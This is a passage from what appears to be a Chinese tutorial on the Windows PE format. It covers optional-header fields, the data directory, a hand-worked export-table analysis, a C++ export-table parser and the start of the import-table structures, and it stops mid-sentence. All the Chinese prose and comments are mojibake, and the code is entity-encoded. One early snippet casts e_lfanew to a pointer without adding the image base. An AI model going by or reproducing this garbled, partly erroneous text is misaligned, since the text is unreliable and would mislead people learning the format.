Magic;\t\t\t\t\t\t&#x2F;&#x2F;[0x18] (1) æ ‡å¿—ä½\n    BYTE    MajorLinkerVersion; \t\t&#x2F;&#x2F;[0x1A] (2) è¿æ¥å™¨ä¸»ç‰ˆæœ¬å·\n    BYTE    MinorLinkerVersion; \t\t&#x2F;&#x2F;[0x1B] (3) è¿æ¥å™¨å­ç‰ˆæœ¬å·\n    DWORD   SizeOfCode; \t\t\t\t&#x2F;&#x2F;[0x1C] (4) æ‰€æœ‰ä»£ç æ®µ çš„æ€»å¤§å°\n    DWORD   SizeOfInitializedData; \t\t&#x2F;&#x2F;[0x20] (5) æ‰€æœ‰åˆå§‹åŒ–æ®µæ€»å¤§å°\n    DWORD   SizeOfUninitializedData;\t&#x2F;&#x2F;[0x24] (6) æ‰€æœ‰æœªåˆå§‹åŒ–æ®µæ€»å¤§å°\n    DWORD   AddressOfEntryPoint;\t\t&#x2F;&#x2F;[0x28] (7) ç¨‹åºæ‰§è¡Œå…¥å£RVA*\n    DWORD   BaseOfCode; \t\t\t\t&#x2F;&#x2F;[0x2C] (8) ä»£ç æ®µèµ·å§‹RVA\n    DWORD   BaseOfData; \t\t\t\t&#x2F;&#x2F;[0x30] (9) æ•°æ®æ®µèµ·å§‹RVA\n    &#x2F;&#x2F; NT é™„åŠ åŸŸ\n    DWORD   ImageBase; \t\t\t\t\t&#x2F;&#x2F;[0x34] (10) ç¨‹åºé»˜è®¤è½½å…¥åŸºåœ°å€*\n    DWORD   SectionAlignment; \t\t\t&#x2F;&#x2F;[0x38] (11) å†…å­˜ä¸­çš„æ®µå¯¹é½å€¼\n    DWORD   FileAlignment; \t\t\t\t&#x2F;&#x2F;[0x3C] (12) æ–‡ä»¶ä¸­çš„æ®µå¯¹é½å€¼\n    WORD    MajorOperatingSystemVersion; &#x2F;&#x2F;[0x40] (13) ç³»ç»Ÿä¸»ç‰ˆæœ¬å·\n    WORD    MinorOperatingSystemVersion; &#x2F;&#x2F;[0x42] (14) ç³»ç»Ÿå­ç‰ˆæœ¬å·\n    WORD    MajorImageVersion; \t\t\t&#x2F;&#x2F;[0x44] (15) è‡ªå®šä¹‰çš„ä¸»ç‰ˆæœ¬å·\n    WORD    MinorImageVersion;\t\t\t&#x2F;&#x2F;[0x46] (16) è‡ªå®šä¹‰çš„å­ç‰ˆæœ¬å·\n    WORD    MajorSubsystemVersion; \t\t&#x2F;&#x2F;[0x48] (17) æ‰€éœ€å­ç³»ç»Ÿä¸»ç‰ˆæœ¬å·\n    WORD    MinorSubsystemVersion; \t\t&#x2F;&#x2F;[0x4A] (18) æ‰€éœ€å­ç³»ç»Ÿå­ç‰ˆæœ¬å·\n DWORD   Win32VersionValue;\t\t\t\t&#x2F;&#x2F;[0x4C] (19) ä¿ç•™ï¼Œé€šå¸¸ä¸º0x00\n    DWORD   SizeOfImage; \t\t\t\t&#x2F;&#x2F;[0x50] (20) å†…å­˜ä¸­æ˜ åƒæ€»å°ºå¯¸*\n    DWORD   SizeOfHeaders; \t\t\t\t&#x2F;&#x2F;[0x54] (21) å„ä¸ªæ–‡ä»¶å¤´çš„æ€»å°ºå¯¸*\n    DWORD   CheckSum; \t\t\t\t\t&#x2F;&#x2F;[0x58] (22) æ˜ åƒæ–‡ä»¶æ ¡éªŒå’Œ\n    WORD     Subsystem; \t            &#x2F;&#x2F;[0x5C] (23) æ–‡ä»¶å­ç³»ç»Ÿ\n    WORD     DllCharacteristics; \t\t&#x2F;&#x2F;[0x5E] (24) DLLæ ‡å¿—ä½\n    DWORD   SizeOfStackReserve;         &#x2F;&#x2F;[0x60] (25) åˆå§‹åŒ–æ ˆå¤§å°\n    DWORD   SizeOfStackCommit;        \t&#x2F;&#x2F;[0x64] (26) åˆå§‹åŒ–å®é™…æäº¤æ ˆå¤§å°\n    DWORD   SizeOfHeapReserve;         \t&#x2F;&#x2F;[0x68] (27) åˆå§‹åŒ–ä¿ç•™æ ˆå¤§å°\n    DWORD   SizeOfHeapCommit;         \t&#x2F;&#x2F;[0x6C] (28) åˆå§‹åŒ–å®é™…ä¿ç•™æ ˆå¤§å°\n    DWORD   LoaderFlags;                &#x2F;&#x2F;[0x70] (29) è°ƒè¯•ç›¸å…³ï¼Œé»˜è®¤0x00\n    DWORD   NumberOfRvaAndSizes;  \t\t&#x2F;&#x2F;[0x74] (30) æ•°æ®ç›®å½•è¡¨çš„æ•°é‡*\n    IMAGE_DATA_DIRECTORY DataDirectory[0x10]; &#x2F;&#x2F;[0x78] (31) æ•°æ®ç›®å½•è¡¨*\n&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;\n\n\n\néå¸¸é‡è¦çš„ï¼š\nImageBaseï¼šç¨‹åºçš„é»˜è®¤åŠ è½½åŸºå€ã€‚\nAddressOfEntryPointï¼š ç¨‹åºçš„å…¥å£ç‚¹ï¼ˆEPï¼‰ã€‚\næ¯”è¾ƒé‡è¦çš„ï¼š\nSectionAlignmentï¼š å†…å­˜å¯¹é½ 0x1000ï¼ˆå› ä¸ºä¸€é¡µå†…å­˜æ˜¯4KBï¼‰\nFileAlignmentï¼š æ–‡ä»¶å¯¹é½ 0x200\nSizeOfImageï¼š æ˜ åƒå¤§å°ï¼ˆæˆ‘è¿™ä¸ªPEæ–‡ä»¶è¢«åŠ è½½åˆ°å†…å­˜ï¼Œå ç”¨ç©ºé—´åº”è¯¥æ˜¯å¤šå¤§ï¼‰\nSIzeOfHeaderï¼š å¤´éƒ¨å¤§å° DOSå¤´+NTå¤´+åŒºå—è¡¨çš„å¤§å°ã€‚\nNumberOfRvaAndSizes: æ•°æ®ç›®å½•è¡¨çš„å…ƒç´ ä¸ªæ•°\nDllCharacteristicsï¼š PEçš„ä¸€ç»„å±æ€§ã€‚ã€‚ã€‚ã€‚\næä¸ºé‡è¦çš„ï¼š\næ•°æ®ç›®å½•è¡¨DataDirectory\n&#x2F;&#x2F;æ‰“å¼€PEæ–‡ä»¶åï¼Œç¬¬ä¸€ä¸ªæ®µå°±æ˜¯DOSå¤´éƒ¨\nPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n&#x2F;&#x2F;pDosçš„e_lfanewå­—æ®µå¯ä»¥æŒ‡å‘NTå¤´çš„ç©ºé—´ï¼Œä½¿ç”¨NTå¤´æ¥æ”¶\nPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)pDos-&gt;e_lfanew;\n&#x2F;&#x2F;NTå¤´ç»“æ„ä½“çš„ç¬¬ä¸‰ä¸ªå‚æ•°å°±æ˜¯æŒ‡å‘æ‰©å±•å¤´\n\tPIMAGE_OPTIONAL_HEADER pOption &#x3D;  (PIMAGE_OPTIONAL_HEADER)&amp;pNt-&gt;OptionalHeader;\n&#x2F;&#x2F;æ‰©å±•å¤´æœ€åä¸€ä¸ªå‚æ•°å°±æ˜¯æ•°æ®ç›®å½•è¡¨\nPIMAGE_DATA_DIRECTORY pDataDir &#x3D; pOption-&gt;DataDirectory;\n\næè¿°äº†PEæ–‡ä»¶ä¸­16ä¸ªéå¸¸é‡è¦çš„æ•°æ®å—çš„å¤§å°å’Œä½ç½®ã€‚\n\n\nå¯¼å‡ºè¡¨ä»€ä¹ˆæ˜¯å¯¼å‡ºæä¾›å‡½æ•°ç»™å…¶ä»–æ¨¡å—ä½¿ç”¨çš„ä¸€ç§è¡Œä¸º\næ€ä¹ˆå¯¼å‡ºæ–¹æ³•1ï¼šå£°æ˜å¯¼å‡º\n#pragma once\nextern &quot;C&quot; _declspec(dllexport) void Fun1();\nextern &quot;C&quot; _declspec(dllexport) void Fun2();\n\næ–¹æ³•2ï¼šdefæ–‡ä»¶å¯¼å‡º\nEXPORTS \nFun3 @1 \nFun4 @2 NONAME\n\næ³¨æ„ï¼šNONAME æ˜¯åªå¯¼å‡ºåºå·ï¼Œæ²¡æœ‰åå­—\nå¯¼å‡ºè¡¨çš„ä½œç”¨æ˜¯ä»€ä¹ˆ? æ²¡æœ‰å®ƒexeèƒ½è¿è¡Œå—?\nç”¨ä»¥è®°å½•æœ¬æ¨¡å—èƒ½å¤Ÿç»™å…¶ä»–æ¨¡å—æä¾›çš„å‡½æ•°çš„ä¿¡æ¯ã€‚\nå‡½æ•°å å‡½æ•°åœ°å€ å‡½æ•°çš„åºå·\nç¨‹åºè¿è¡Œçš„æ—¶å€™ï¼Œä¼šæ£€æŸ¥ä¸»æ¨¡å—çš„å¯¼å…¥è¡¨ï¼Œçœ‹ç”¨äº†å“ªäº›å…¶ä»–æ¨¡å—ï¼Œå°±ä¼šå°†æ­¤æ¨¡å—åŠ è½½åˆ°è¿›ç¨‹ç©ºé—´ä¸­ã€‚åŠ è½½è¿›æ¥ä¹‹åï¼Œåˆ†æINTï¼ˆIATï¼‰å¾—åˆ°å‡½æ•°åç§°ï¼Œç”¨è¿™ä¸ªåç§°å»å¯¼å‡ºè¡¨ä¸­æ‰¾åˆ°å‡½æ•°åœ°å€çš„RVAï¼ŒRVA+æ¨¡å—åŸºå€ï¼Œå°±æ˜¯çœŸæ­£çš„å‡½æ•°åœ°å€ï¼Œå°†æ­¤å‡½æ•°åœ°å€å¡«å……åˆ°IATä¸­ï¼Œä»è€Œå®ŒæˆåŠ è½½åçš„IATåŠŸèƒ½ã€‚\nä¸€ä¸ªPEæ–‡ä»¶ï¼Œå¯ä»¥æ²¡æœ‰å¯¼å‡ºè¡¨çš„ï¼Œæ¯”å¦‚exeæ–‡ä»¶ï¼Œä¸€èˆ¬éƒ½æ²¡æœ‰ã€‚\nå·²çŸ¥ä¸€ä¸ªdllå,å’Œä¸€ä¸ªdllå¯¼å‡ºå‡½æ•°çš„åå­—, å¦‚ä½•å¾—åˆ°è¿™ä¸ªå‡½æ•°åçš„åœ°å€?\nå¾—åˆ°DLLçš„å¯¼å‡ºè¡¨ï¼Œç„¶ååœ¨å‡½æ•°åç§°è¡¨ä¸­æ‰¾å‡½æ•°åï¼Œå¦‚æœæ‰¾åˆ°äº†ï¼Œç”±äºåºå·è¡¨å’Œåç§°è¡¨ä½ç½®æ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œå°±ä¼šå¾—åˆ°åºå·è¡¨çš„ä¸‹æ ‡ï¼Œç„¶åå°±å°†åºå·å½“æˆåœ°å€è¡¨çš„ä¸‹æ ‡ï¼Œä»è€Œå¾—åˆ°åœ°å€ã€‚\nGetProcAddress();\næ€ä¹ˆæ‰èƒ½çŸ¥é“ä¸€ä¸ªexeéƒ½ä½¿ç”¨äº†å“ªäº›API?\nåˆ†æexeçš„å¯¼å…¥è¡¨å³å¯ï¼Œå…¶ä¸­è®°å½•äº†æ¨¡å—åå’Œå‡½æ•°åã€‚\nå¦‚ä½•åˆ¤æ–­å¯¼å…¥å‡½æ•°æ˜¯ä»¥åºå·å¯¼å…¥æˆ–æ˜¯ä»¥åç§°å¯¼å…¥?\nIMAGE_THUNK_DATA32è¿™ä¸ªç»“æ„ä½“ï¼Œä»–çš„æœ€é«˜ä½æ˜¯1çš„è¯ï¼Œé‚£ä¹ˆå°±åªæœ‰åºå·ï¼Œå¦‚æœæœ€é«˜ä½æ˜¯0çš„è¯ï¼Œé‚£ä¹ˆä¹…æœ‰åºå·ï¼Œä¹Ÿæœ‰åç§°ã€‚\næ€ä¹ˆæ‰çŸ¥é“å¯¼å‡ºå‡½æ•°æ˜¯ä»…ä»¥åºå·å¯¼å‡ºè¿˜æ˜¯ä»¥åç§°å¯¼å‡º?\nå¯¹äºä¸€ä¸ªå¯¼å‡ºå‡½æ•°è€Œè¨€ï¼Œä»–çš„åœ°å€è¡¨çš„ä¸‹æ ‡ï¼Œå°±æ˜¯æ­¤å‡½æ•°çš„åºå·ï¼Œå¦‚æœè¿™ä¸ªåºå·ï¼Œåœ¨åºå·è¡¨ä¸­ï¼Œæ²¡æœ‰è®°å½•ï¼Œé‚£ä¹ˆä»–å°±æ˜¯ä¸€ä¸ªè™šåºå·ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰åç§°ï¼Œåªæœ‰åºå·ã€‚\næ€ä¹ˆæ‰¾åˆ°ä¸€ä¸ªPEæ–‡ä»¶çš„å¯¼å‡ºä¿¡æ¯é€šè¿‡æ•°æ®ç›®å½•è¡¨çš„ç¬¬0é¡¹ï¼š\næ‰‹å·¥åˆ†æè¿‡ç¨‹ï¼š\n\nè·å¾—ä¿¡æ¯ï¼šå¯¼å‡ºè¡¨çš„RVAï¼š00018D90 â€”â€”&gt;FOAï¼š 7590 (FOA&#x3D; RVA - RVAåŒºæ®µ+ FOAåŒºæ®µ)\nå¤‡æ³¨ï¼š\n FOA:æ–‡ä»¶çš„åç§»ä½ç½®\n RVAï¼šç›¸å¯¹è™šæ‹Ÿåœ°å€\n RVAåŒºæ®µï¼šè¯¥æ®µæ®µé¦–åœ°å€\n FOAåŒºæ®µï¼šæ–‡ä»¶åç§»çš„æ®µé¦–åœ°å€\nSIZEï¼š5F21\n\n\næ¨¡å—åç§°åœ¨12ä¸ªå­—èŠ‚åçš„å››ä¸ªå­—èŠ‚ä¸­ï¼Œä¹Ÿå°±æ˜¯0x0001DBEA\nBase:00 00 00 01 ç´¢å¼•åŸºæ•°\nNumberOfFunctions:00 00 13 88 å¯¼å‡ºåœ°å€è¡¨ä¸­æˆå‘˜ä¸ªæ•°\nNumberOfNames:00 00 00 03\nAddressOfFunctions(rva):00 01 8D B8 å¯¼å‡ºåœ°å€è¡¨ï¼ˆEATï¼‰\nAddressOfNames(rva):00 01 DB D8 å¯¼å‡ºåç§°è¡¨ï¼ˆENTï¼‰\nAddressOfNameOrdinals;ï¼š0x1DBE4 æŒ‡å‘å¯¼å‡ºåºå·è¡¨\ntypedef struct _IMAGE_EXPORT_DIRECTORY &#123;\n    DWORD  Characteristics;\t   &#x2F;&#x2F; (1) ä¿ç•™ï¼Œæ’ä¸º0x00000000\n    DWORD  TimeDateStamp;\t   &#x2F;&#x2F; (2) æ—¶é—´æˆ³\n    WORD   MajorVersion;\t   &#x2F;&#x2F; (3) ä¸»ç‰ˆæœ¬å·ï¼Œä¸€èˆ¬ä¸èµ‹å€¼\n    WORD   MinorVersion;\t   &#x2F;&#x2F; (4) å­ç‰ˆæœ¬å·ï¼Œä¸€èˆ¬ä¸èµ‹å€¼\n    DWORD  Name;\t\t   &#x2F;&#x2F; (5) æ¨¡å—åç§°*\n    DWORD  Base;\t\t   &#x2F;&#x2F; (6) ç´¢å¼•åŸºæ•°*\n    DWORD  NumberOfFunctions;  &#x2F;&#x2F; (7) å¯¼å‡ºåœ°å€è¡¨ä¸­æˆå‘˜ä¸ªæ•°*\n    DWORD  NumberOfNames; \t   &#x2F;&#x2F; (8) å¯¼å‡ºåç§°è¡¨ä¸­æˆå‘˜ä¸ªæ•°*\n    DWORD  AddressOfFunctions; &#x2F;&#x2F; (9) å¯¼å‡ºåœ°å€è¡¨ï¼ˆEATï¼‰*\n    DWORD  AddressOfNames;\t   &#x2F;&#x2F; (10) å¯¼å‡ºåç§°è¡¨ï¼ˆENTï¼‰*\n    DWORD  AddressOfNameOrdinals; &#x2F;&#x2F; (11) æŒ‡å‘å¯¼å‡ºåºå·è¡¨*\n&#125;IMAGE_EXPORT_DIRECTORY,*PIMAGE_EXPORT_DIRECTORY;\n\næ¨¡å—åç§°0x0001DBEA è½¬æ¢RVA â€”FOA: C3EA\n\n\næ‰¾åˆ°dll.dll\nåœ°å€è¡¨æˆå‘˜ä¸ªæ•°ä¸º1388è½¬æ¢æˆå­—èŠ‚ï¼š1388h&#x3D;5000d åå…­è¿›åˆ¶è½¬æ¢ä¸ºåè¿›åˆ¶\n 1388*4&#x3D;4E20 åå…­è¿›åˆ¶æ•°ä¹˜4\n 5000*4&#x3D;20000 åè¿›åˆ¶æ•°ä¹˜4\næˆ‘ä»¬ä»åœ°å€è¡¨ï¼š0x 18DB8å¼€å§‹æ‰¾ï¼Œç”±äº18DB8æ˜¯RVAï¼Œè¿™é‡Œéœ€è¦è½¬æ¢FOA:75B8\n\n\nAddressOfNameOrdinals;ï¼š1DBE4 æŒ‡å‘å¯¼å‡ºåºå·è¡¨ è½¬æ¢FOA:C3E4\n\n\n#include &lt;iostream&gt;\n#include &lt;Windows.h&gt;\n#define PATH L&quot;C:\\\\Users\\\\SouLinker\\\\Desktop\\\\dll.dll&quot;\n&#x2F;&#x2F; åˆ¤æ–­æ˜¯ä¸æ˜¯PEæ–‡ä»¶\n\n\nDWORD RvaToFoa(char* lpImage, DWORD dwRva);\nBOOL IsPE_File(char* lpImage);\nvoid AnalyzeExportsTabel(char* lpImage);\nint main()\n&#123;\n\t&#x2F;&#x2F;1 æ‰“å¼€æ–‡ä»¶\n\tHANDLE hFile &#x3D; CreateFile(\n\t\tPATH,\n\t\tGENERIC_ALL,\n\t\tNULL,\n\t\tNULL,\n\t\tOPEN_EXISTING,\n\t\tFILE_ATTRIBUTE_NORMAL,\n\t\tNULL\n\t);\n\t&#x2F;&#x2F;2 è·å–æ–‡ä»¶å¤§å°\n\tDWORD dwFileSize &#x3D; GetFileSize(hFile, NULL);\n\t&#x2F;&#x2F;3 ç”³è¯·ç©ºé—´å¹¶åˆå§‹åŒ–\n\tchar* buf &#x3D; new char[dwFileSize] &#123;0&#125;;\n\t&#x2F;&#x2F;4 è¯»å–æ–‡ä»¶\n\tDWORD dwRealSize &#x3D; 0;\n\tReadFile(hFile, buf, dwFileSize, &amp;dwRealSize, NULL);\n\t&#x2F;&#x2F;5 åˆ¤æ–­æ˜¯ä¸æ˜¯PEæ–‡ä»¶\n\tif (IsPE_File(buf) &#x3D;&#x3D; TRUE)\n\t&#123;\n\t\t&#x2F;&#x2F;printf(&quot;è¿™æ˜¯ä¸€ä¸ªPEæ–‡ä»¶&quot;);\n\t\tAnalyzeExportsTabel(buf);\n\t&#125;\n\telse\n\t&#123;\n\t\tprintf(&quot;è¿™ä¸æ˜¯ä¸€ä¸ªPEæ–‡ä»¶&quot;);\n\t&#125;\n\tdelete[]buf;\n\tbuf &#x3D; nullptr;\n\treturn 0;\n&#125;\n\nDWORD RvaToFoa(char* lpImage, DWORD dwRva)\n&#123;\n\t&#x2F;&#x2F;1 è·å–åŒºæ®µè¡¨çš„èµ·å§‹ä½ç½®\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);\n\tPIMAGE_SECTION_HEADER pHeader &#x3D; IMAGE_FIRST_SECTION(pNt);\n\n\tif (dwRva &lt; pNt-&gt;OptionalHeader.SizeOfHeaders)\n\t&#123;\n\t\treturn dwRva;\n\t&#125;\n\t&#x2F;&#x2F;2 å¾ªç¯åˆ¤æ–­RVAè½åœ¨äº†å“ªä¸ªåŒºæ®µä¸­\n\tfor (int i &#x3D; 0; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)\n\t&#123;\n\t\tDWORD dwSectionRva &#x3D; pHeader[i].VirtualAddress;\n\t\tDWORD dwSectionEndRva &#x3D; dwSectionRva + pHeader[i].SizeOfRawData;\n\t\tDWORD dwSectionFOA &#x3D; pHeader[i].PointerToRawData;\n\t\tif (dwRva &gt;&#x3D; dwSectionRva &amp;&amp; dwRva &lt;&#x3D; dwSectionEndRva)\n\t\t&#123;\n\t\t\tpHeader[i].VirtualAddress;\n\t\t\tDWORD dwFOA &#x3D; dwRva - dwSectionRva + dwSectionFOA;\n\t\t\treturn dwFOA;\n\t\t&#125;\n\t&#125;\n\treturn -1;\n&#125;\nBOOL IsPE_File(char* lpImage)\n&#123;\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n\tif (pDos-&gt;e_magic !&#x3D; IMAGE_DOS_SIGNATURE)\n\t&#123;\n\t\treturn FALSE;\n\t&#125;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);\n\n\tif (pNt-&gt;Signature !&#x3D; IMAGE_NT_SIGNATURE)\n\t&#123;\n\t\treturn FALSE;\n\t&#125;\n\treturn TRUE;\n&#125;\n\nvoid AnalyzeExportsTabel(char* lpImage)\n&#123;\n\t&#x2F;&#x2F;1 è·å–åˆ°å¯¼å‡ºè¡¨çš„ç»“æ„\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);\n\t&#x2F;&#x2F;1 è·å–åˆ°å¯¼å‡ºè¡¨çš„æ•°æ®ç›®å½•ç»“æ„\n\tPIMAGE_DATA_DIRECTORY pExportDir &#x3D;  &amp;pNt-&gt;OptionalHeader.DataDirectory[0];\n\t&#x2F;&#x2F;1 å¯¼å‡ºè¡¨çš„æ•°æ®ç›®å½•ç»“æ„ä¸­ï¼Œæœ‰å¯¼å‡ºè¡¨çš„RVAï¼Œå’±ä»¬éœ€è¦å°†å…¶è½¬æ¢ä¸ºFOAï¼Œæ‰èƒ½åœ¨æ–‡ä»¶ä¸­ä½¿ç”¨\n\tDWORD dwExportFOA &#x3D; RvaToFoa(lpImage, pExportDir-&gt;VirtualAddress);\n\t&#x2F;&#x2F;1 å·²ç»å¾—åˆ°äº†FOAï¼Œç›´æ¥å°±èƒ½å¤Ÿæ‰¾åˆ°å¯¼å‡ºè¡¨çš„ç»“æ„\n\tPIMAGE_EXPORT_DIRECTORY pExport &#x3D; (PIMAGE_EXPORT_DIRECTORY)(lpImage + dwExportFOA);\n\t&#x2F;&#x2F;typedef struct _IMAGE_EXPORT_DIRECTORY &#123;\n\t&#x2F;&#x2F;\tDWORD   Characteristics;\n\t&#x2F;&#x2F;\tDWORD   TimeDateStamp;\n\t&#x2F;&#x2F;\tWORD    MajorVersion;\n\t&#x2F;&#x2F;\tWORD    MinorVersion;\n\t&#x2F;&#x2F;\tDWORD   Name;\n\t&#x2F;&#x2F;\tDWORD   Base;\n\t&#x2F;&#x2F;\tDWORD   NumberOfFunctions;\n\t&#x2F;&#x2F;\tDWORD   NumberOfNames;\n\t&#x2F;&#x2F;\tDWORD   AddressOfFunctions;     &#x2F;&#x2F; RVA from base of image\n\t&#x2F;&#x2F;\tDWORD   AddressOfNames;         &#x2F;&#x2F; RVA from base of image\n\t&#x2F;&#x2F;\tDWORD   AddressOfNameOrdinals;  &#x2F;&#x2F; RVA from base of image\n\t&#x2F;&#x2F;&#125; IMAGE_EXPORT_DIRECTORY, * PIMAGE_EXPORT_DIRECTORY;\n\tDWORD dwBase &#x3D; pExport-&gt;Base;\n\t&#x2F;&#x2F;2 å¾—åˆ°åœ°å€è¡¨ï¼Œåç§°è¡¨ï¼Œåºå·è¡¨çš„ FOA\n\tDWORD EatFoa &#x3D; RvaToFoa(lpImage,pExport-&gt;AddressOfFunctions);\n\tDWORD EntFoa &#x3D; RvaToFoa(lpImage, pExport-&gt;AddressOfNames);\n\tDWORD EotFoa &#x3D; RvaToFoa(lpImage, pExport-&gt;AddressOfNameOrdinals);\n\t&#x2F;&#x2F;3 å¾—åˆ°åœ°å€è¡¨ï¼Œåç§°è¡¨ï¼Œåºå·è¡¨åœ¨æ–‡ä»¶ä¸­çš„ä½ç½®\n\tPDWORD  pEat&#x3D; (PDWORD)(lpImage + EatFoa);\n\tPDWORD  pEnt &#x3D; (PDWORD)(lpImage + EntFoa);\n\tPWORD pEot &#x3D; (PWORD)(lpImage + EotFoa);\n\t&#x2F;&#x2F;4 å¼€å§‹è§£æ\n\tfor (int i &#x3D; 0; i &lt; pExport-&gt;NumberOfFunctions; i++)\n\t&#123;\n\t\t&#x2F;&#x2F;4.1 æ— æ•ˆåœ°å€\n\t\tif (pEat[i] &#x3D;&#x3D; 0)\n\t\t&#123;\n\t\t\tcontinue;\n\t\t&#125;\n\t\t&#x2F;&#x2F;4.2 æœ‰æ•ˆåœ°å€å°†ä¸‹æ ‡æ”¾åˆ°åºå·è¡¨ä¸­å»å¯»æ‰¾\n\t\tint  j &#x3D; 0;\n\t\tint nSign &#x3D; FALSE;\n\t\tfor (; j &lt; pExport-&gt;NumberOfNames; j++)\n\t\t&#123;\n\t\t\tif (i &#x3D;&#x3D; pEot[j])\n\t\t\t&#123;\n\t\t\t\tnSign &#x3D; TRUE;\n\t\t\t\tbreak;\n\t\t\t&#125;\n\t\t&#125;\n\t\t&#x2F;&#x2F;4.2.1 æ‰¾åˆ°äº†ï¼Œå°±æ˜¯æœ‰åå­—çš„å‡½æ•°\n\t\tif (nSign&#x3D;&#x3D; TRUE)\n\t\t&#123;\n\t\t\t&#x2F;&#x2F;åç§°è¡¨ä¸­ï¼Œå­˜å‚¨çš„æ˜¯RVAï¼Œéœ€è¦è½¬ä¸ºFOA\n\t\t\tDWORD dwFunNameFOA &#x3D;  RvaToFoa(lpImage, pEnt[j]);\n\t\t\tchar* pFunName &#x3D; lpImage + dwFunNameFOA;\n\t\t\tprintf(&quot;åºå·:%4x åœ°å€:%x åç§°:%s\\n&quot;, i+ dwBase, pEat[i], pFunName);\n\t\t&#125;\n\t\t&#x2F;&#x2F;4.2.2 æ²¡æœ‰æ‰¾åˆ°ï¼Œå°±æ˜¯æ²¡æœ‰åå­—çš„å‡½æ•°ï¼Œè™šåºå·\n\t\telse\n\t\t&#123;\n\t\t\tprintf(&quot;åºå·:%4x åœ°å€:%x åç§°:NULL\\n&quot;, i + dwBase, pEat[i]);\n\t\t&#125;\n\t&#125;\n&#125;\n\nå¯¼å…¥è¡¨ä»€ä¹ˆæ˜¯å¯¼å…¥å½“ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ä½¿ç”¨åˆ°äº†å…¶ä»–æ¨¡å—ä¸­çš„å‡½æ•°çš„æ—¶å€™ï¼Œå°±æ˜¯å¯¼å…¥è¡Œä¸ºã€‚åœ¨PEæ–‡ä»¶ä¸­ï¼Œæœ‰ä¸€ä¸ªä½ç½®è®°å½•äº†æ­¤å¯æ‰§è¡Œæ–‡ä»¶ ä½¿ç”¨çš„æ‰€æœ‰å…¶ä»–æ¨¡å—çš„å‡½æ•°ä¿¡æ¯ã€‚è¿™ä¸ªä½ç½®å°±æ˜¯å¯¼å…¥è¡¨ã€‚\nå¯¼å…¥è¡¨çš„ä½œç”¨æ˜¯ä»€ä¹ˆ?\nåœ¨åŠ è½½ä¹‹å‰ï¼Œå¯¼å…¥è¡¨é‡Œé¢è®°å½•æœ¬æ¨¡å—æ‰€ä½¿ç”¨çš„å“ªäº›DLLä¸­çš„å“ªäº›å‡½æ•°çš„åç§°ä¿¡æ¯ã€‚\nåœ¨åŠ è½½ä¹‹åï¼Œå¯¼å…¥è¡¨èƒ½å¤Ÿè®°å½•æ‰€ä½¿ç”¨çš„å‡½æ•°çš„åœ°å€ã€‚ä¾›ç¨‹åºè¿è¡ŒæœŸé—´ï¼Œæ‰¾åˆ°æ‰€ä½¿ç”¨çš„å‡½æ•°ã€‚\nå¯¼å…¥è¡¨ç»“æ„ä½“\nC++\ntypedef struct _IMAGE_IMPORT_DESCRIPTOR &#123;\n    union &#123;\n        DWORD Characteristics; \n        DWORD OriginalFirstThunk;&#x2F;&#x2F;(1) æŒ‡å‘å¯¼å…¥åç§°è¡¨(INT)çš„RAV*\n    &#125;;\n    DWORD   TimeDateStamp;\t&#x2F;&#x2F; (2) æ—¶é—´æ ‡è¯†\n    DWORD   ForwarderChain;\t&#x2F;&#x2F; (3) è½¬å‘é“¾ï¼Œå¦‚æœä¸è½¬å‘åˆ™æ­¤å€¼ä¸º0\n    DWORD   Name;\t\t&#x2F;&#x2F; (4) æŒ‡å‘å¯¼å…¥æ˜ åƒæ–‡ä»¶çš„åå­—*\n    DWORD   FirstThunk;\t&#x2F;&#x2F; (5) æŒ‡å‘å¯¼å…¥åœ°å€è¡¨ï¼ˆIATï¼‰çš„RAV*\n&#125; IMAGE_IMPORT_DESCRIPTOR;\n\nOriginalFirstThunkä¸FirstThunkå¾—åˆ°ä½ç½®ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªç»“æ„ä½“æ•°ç»„ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š\ntypedef struct _IMAGE_THUNK_DATA32 &#123;\n    union &#123;\n        PBYTE  ForwarderString;\t                                          &#x2F;&#x2F; (1) è½¬å‘å­—ç¬¦ä¸²çš„RAV\n        PDWORD Function;\t\t                &#x2F;&#x2F; (2) è¢«å¯¼å…¥å‡½æ•°çš„åœ°å€\n        DWORD Ordinal;\t\t                &#x2F;&#x2F; (3) è¢«å¯¼å…¥å‡½æ•°çš„åºå·\n        PIMAGE_IMPORT_BY_NAME  AddressOfData;    &#x2F;&#x2F; (4) æŒ‡å‘è¾“å…¥åç§°è¡¨\n&#125; u1;\n&#125; IMAGE_THUNK_DATA32;\n\n\nå½“æ­¤ç»“æ„ä½“æœ€é«˜ä½ä¸º0çš„æ—¶å€™ï¼Œä¸”æ­¤æ—¶å­˜å‚¨çš„æ˜¯å¯¼å…¥åç§°ä¿¡æ¯ï¼ŒPIMAGE_IMPORT_BY_NAMEèµ·ä½œç”¨\nå½“æ­¤ç»“æ„ä½“æœ€é«˜ä½ä¸º1çš„æ—¶å€™ï¼Œä¸”æ­¤æ—¶å­˜å‚¨çš„æ˜¯å¯¼å…¥åç§°ä¿¡æ¯ï¼Œ DWORD Ordinalèµ·ä½œç”¨\nå½“æ­¤ç»“æ„ä½“å­˜å‚¨çš„æ˜¯å¯¼å…¥åœ°å€ä¿¡æ¯çš„æ—¶å€™ï¼ŒPDWORD 